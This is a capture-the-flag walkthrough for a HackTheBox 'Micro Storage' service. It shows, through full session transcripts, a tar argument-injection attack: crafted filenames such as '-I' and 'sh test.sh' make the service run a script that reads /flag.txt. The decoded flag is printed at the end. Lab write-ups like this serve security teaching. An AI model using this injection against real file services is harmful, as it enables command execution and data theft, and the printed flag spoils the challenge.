> Some group of people seem to have made a network service that lets you store files temporarily. But little did they know about the mistake they made coding their script... Try to get familiar with their service and discover the vulnerability behind it. Your goal is to leak the contents of /𝗳𝗹𝗮𝗴.𝘁𝘅𝘁.

1. We tried to connect to the service and check its utilities.
   - For option 1, we can decide filename and its content.
   - For option 2, it lists the file that we created.
   - For option 3, it deletes a file according to file id (0-9)
   - For option 4, it shows a file's content according to file id (0-9)
   - For option 5, it compresses all the files in tar and output base64 encoded tar. (perhaps `tar` and `base64` were used)

```bash
$ nc 165.22.115.189 32212
.-------------------------------------------------------------------------------------.
| ___  ____                  _____ _                                      __   _____  |
| |  \/  (_)                /  ___| |                                    /  | |  _  | |
| | .  . |_  ___ _ __ ___   \ `--.| |_ ___  _ __ __ _  __ _  ___  __   __`| | | |/' | |
| | |\/| | |/ __| '__/ _ \   `--. \ __/ _ \| '__/ _` |/ _` |/ _ \ \ \ / / | | |  /| | |
| | |  | | | (__| | | (_) | /\__/ / || (_) | | | (_| | (_| |  __/  \ V / _| |_\ |_/ / |
| \_|  |_/_|\___|_|  \___/  \____/ \__\___/|_|  \__,_|\__, |\___|   \_/  \___(_)___/  |
|             B y  H a c k T h e B o x  L a b s        __/ |                          |
|                                                     |___/                           |
`-----------------------.                                   .-------------------------'
                        |  Welcome to your online temporary |
                        |            Micro Storage          |
                        `-----------------------------------'

                                   \!/ WARNING \!/
   Your storage only lasts during the ongoing session, once the session killed, all
                  your files will be gone. Use this service responsibly.
                                 ---------o---------

1 => Upload a new file (10 file(s) remaining)             
2 => List your uploaded files (0 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
```

2. Since option `2`, `3` , and `4` don't contain possible injection parameter, we decided to combine option `1` and `5` to execute command injection. However, there are some special characters not allowed as a filename. 
   - After a series of trial-and-error, allowed special characters are `-_+=.`

3. We used [GTFObin](https://gtfobins.github.io/gtfobins/tar/) and [HackTricks](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions) to check whether there was something to complete command injection.

```
1 => Upload a new file (10 file(s) remaining)             
2 => List your uploaded files (0 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
[*] Enter your file name: xf
[*] Start typing your file content: (send 'EOF' when done)
1
EOF
[+] Your file "xf" has been saved. (2 bytes written)
1 => Upload a new file (9 file(s) remaining)             
2 => List your uploaded files (1 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
[*] Enter your file name: -I
[*] Start typing your file content: (send 'EOF' when done)
2
EOF
[+] Your file "-I" has been saved. (2 bytes written)
1 => Upload a new file (8 file(s) remaining)             
2 => List your uploaded files (2 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
[*] Enter your file name: pwd
[*] Start typing your file content: (send 'EOF' when done)
3
EOF
[+] Your file "pwd" has been saved. (2 bytes written)
1 => Upload a new file (7 file(s) remaining)             
2 => List your uploaded files (3 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 5
[+] Your base64 encoded archive:
L2hvbWUvc3RvcmFnZS9kZmJhMWRkNzU3MGE2OTVjYTY1OGM0ZTcxZTNjMmIxMgo=
```

4. We cannot use `/` to get `/flag.txt` from filename. Therefore, we decided to put `cat /flag.txt` inside a script file, `test.sh`, and execute `tar xf -I "sh test.sh"`.
   - First, we added execution permission to our `test.sh`
   - The file deletion will change the index of the files, and thus we needed to write our command in advance.

```shell
1 => Upload a new file (10 file(s) remaining)             
2 => List your uploaded files (0 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1 
[*] Enter your file name: xf 
[*] Start typing your file content: (send 'EOF' when done)
1EOF
[+] Your file "xf" has been saved. (1 bytes written)
1 => Upload a new file (9 file(s) remaining)             
2 => List your uploaded files (1 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
[*] Enter your file name: -I
[*] Start typing your file content: (send 'EOF' when done)
EOF
1 => Upload a new file (8 file(s) remaining)             
2 => List your uploaded files (2 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
[*] Enter your file name: chmod +x test.sh
[*] Start typing your file content: (send 'EOF' when done)
EOF
[+] Your file "chmod +x test.sh" has been saved. (0 bytes written)
1 => Upload a new file (7 file(s) remaining)             
2 => List your uploaded files (3 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
[*] Enter your file name: sh test.sh      
[*] Start typing your file content: (send 'EOF' when done)
EOF
[+] Your file "sh test.sh" has been saved. (0 bytes written)
1 => Upload a new file (6 file(s) remaining)             
2 => List your uploaded files (4 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
[*] Enter your file name: test.sh
[*] Start typing your file content: (send 'EOF' when done)
cat /flag.txt
EOF
[+] Your file "test.sh" has been saved. (14 bytes written)
1 => Upload a new file (5 file(s) remaining)             
2 => List your uploaded files (5 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 5
[+] Your base64 encoded archive:


1 => Upload a new file (5 file(s) remaining)             
2 => List your uploaded files (5 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 3
[*] Enter the file identifier: (0 - 9)
>>> 2
[*] Deleting "chmod +x test.sh"...
[+] File deletion completed.
1 => Upload a new file (6 file(s) remaining)             
2 => List your uploaded files (4 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 2
[*] Fetching your uploaded files...
[*] 0. xf
[*] 1. -I
[*] 2. sh test.sh
[*] 3. test.sh
1 => Upload a new file (6 file(s) remaining)             
2 => List your uploaded files (4 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 5
[+] Your base64 encoded archive:
SFRCe0BidXMxTmdfZ1RmMF9iMU4kX2M0bl9iM19mVW5fczBtM3QxbWVTX19yMWd8LXx0Pz8hIV9fYzRmZGVjZjh9Cg==
```